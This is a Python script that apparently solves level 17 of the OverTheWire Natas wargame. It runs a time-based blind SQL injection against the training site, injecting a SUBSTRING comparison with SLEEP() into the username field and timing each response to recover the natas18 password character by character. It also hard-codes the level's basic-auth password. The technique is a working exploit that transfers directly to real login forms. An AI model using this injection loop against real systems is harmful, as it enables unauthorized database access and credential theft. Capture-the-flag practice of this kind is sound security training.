import requests
import string

PASS_LEN=32
DELAY=8

basicAuth=requests.auth.HTTPBasicAuth('natas17','EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')

u="http://natas17.natas.labs.overthewire.org/"

count=1
password=[]

CHARS=string.ascii_letters+string.digits
char_pos=0

#We check substring for first {count} letters and on confirmation check {count+1}. The confirmation is given if DELAY is achieved
while(count<=32):
    if(len(password)<count):
        password.append(CHARS[char_pos])
    else:
        password[count-1]=CHARS[char_pos]

    payload={
        'username':f"natas18\" AND BINARY SUBSTRING(password,1,{count}) = '{''.join(password)}' AND SLEEP({DELAY}) -- ",
    }

    response=requests.post(u,data=payload,auth=basicAuth)
    print(response.elapsed)
    print(payload)

    if (response.elapsed.seconds>=DELAY):
        print(f"Count {count}: Password {''.join(password)}")
        char_pos=0
        count+=1

    char_pos+=1
    if(char_pos>=len(CHARS)):
        print("No valid character found")
        break